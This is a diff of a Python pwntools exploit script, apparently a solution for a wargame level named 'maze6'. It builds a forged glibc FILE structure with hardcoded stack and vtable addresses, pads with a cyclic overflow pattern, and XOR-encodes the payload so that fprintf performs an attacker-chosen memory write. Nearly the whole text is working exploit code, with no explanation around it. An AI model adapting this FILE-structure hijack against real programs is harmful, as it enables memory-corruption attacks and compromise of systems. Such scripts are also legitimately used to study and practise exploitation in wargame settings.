@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 from pwn import *
 import os
 import time
@@ -18,45 +18,53 @@ def connect_to_level():
 def revfrob(s):
     rvrsd = ''
     for c in s:
-        rvrsd += chr(c ^ 42)
+        rvrsd += chr(ord(c) ^ 42)
     return rvrsd
         
 
 #Craft a faked file struct to be pointed to by fprintf - doing so will write to a memory location
 #of my choice
-def fake_file():
-    _flags = 0xfbad3484
-    _vtable = 0xf7f98580
-    _lock = 0x804a238
-    struct = p32(_flags)         #  _flags  
-    struct += p32(0x0)           #  _IO_read
-    struct += p32(0x0)           #  _IO_read
-    struct += p32(0x0)           #  _IO_read
-    struct += p32(0x0)           #  _IO_writ
-    struct += p32(0x0)           #  _IO_writ
-    struct += p32(0x0)           #  _IO_writ
-    struct += p32(0x0)           #  _IO_buf_
-    struct += p32(0x0)           #  _IO_buf_
-    struct += p32(0x0)           #  _IO_save
-    struct += p32(0x0)           #  _IO_back
-    struct += p32(0x0)           #  _IO_save
-    struct += p32(0x0)           #  _markers
-    struct += p32(0x0)           #  _chain  
-    struct += p32(0x0)           #  _fileno 
-    struct += p32(0x0)           #  _flags2 
-    struct += p32(0x0)           #  _old_off
-    struct += p32(0x0)           #  _cur_col
-    struct += p32(_vtable)       #  _vtable_
-    struct += p32(0x0)           #  _shortbu
-    struct += p32(_lock)         #  _lock   
-    struct += p32(0x0)           #  _offset 
-    struct += p32(0x0)           #  __pad1  
-    struct += p32(0x0)           #  __pad2  
-    struct += p32(0x0)           #  __pad3  
-    struct += p32(0x0)           #  __pad4  
-    struct += p32(0x0)           #  __pad5  
-    struct += p32(0x0)           #  _mode   
-    struct += p32(0x0)           #  _unused2
+def fake_file(writeaddr):
+    #_flags = 0xfbad3484
+    _flags = 0x0
+    _vtable = 0xf7f98580-16
+    _lock = 0xffffd07d
+#  _flags           = -72534908,
+#  _IO_read_ptr     = 0x0,
+#  _IO_read_end     = 0x0,
+#  _IO_read_base    = 0x0,
+    struct = p32(_flags)             #  _flags           
+    struct += p32(0x0)               #  _IO_read_ptr   
+    struct += p32(0x0)               #  _IO_read_end   
+    struct += p32(0x0)               #  _IO_read_base  
+    struct += p32(0x0)               #  _IO_write_base 
+    struct += p32(0x0)               #  _IO_write_ptr  
+    struct += p32(0x0)               #  _IO_write_end  
+    struct += p32(writeaddr)         #  _IO_buf_base   
+    struct += p32(writeaddr+8)       #  _IO_buf_end    
+    struct += p32(0x0)               #  _IO_save_base  
+    struct += p32(0x0)               #  _IO_backup_base
+    struct += p32(0x0)               #  _IO_save_end   
+    struct += p32(0x0)               #  _markers       
+    struct += p32(0x0)               #  _chain         
+    struct += p32(0x0)               #  _fileno        
+    struct += p32(0x0)               #  _flags2        
+    struct += p32(0x0)               #  _old_offset    
+    struct += p32(0x0)               #  _cur_column    
+    struct += p32(_vtable)           #  _vtable_offset 
+    struct += p32(0x0)               #  _shortbuf     
+    struct += p32(_lock)             #  _lock            
+    struct += p64(0xfffffffffffff)   #  _offset 
+    struct += p32(0x0)               #  __pad1           
+    struct += p32(0x0)               #  __pad2           
+    struct += p32(0x0)               #  __pad3           
+    struct += p32(0x0)               #  __pad4           
+    struct += p32(0x0)               #  __pad5           
+    struct += p32(0x0)               #  _mode            
+    for i in range(0, 40):
+        #struct += b'\xd0\xff\xff\x6d'#  _unused2
+        struct += p32(0x0) #  _unused2
+
     return struct
 
 #binary = ELF("maze6")
@@ -99,5 +107,8 @@ def fake_file():
 #  _mode            = 0,
 #  _unused2         = '\000' <repeats 39 times>
 #}
-#print(revfrob(p32(0x69696969)))
-print(revfrob(b'FAKEFILE=') + revfrob(fake_file())+'k'*139+'\xff\xff\xff\xff')
+
+writeloc = 0xffffd064
+print(revfrob(cyclic(272) + b'\x6c\xd0\xff\xff' + 'FAKEFILE=' + fake_file(writeloc) + b'\xff\xff\xdc\x09'))
+
+
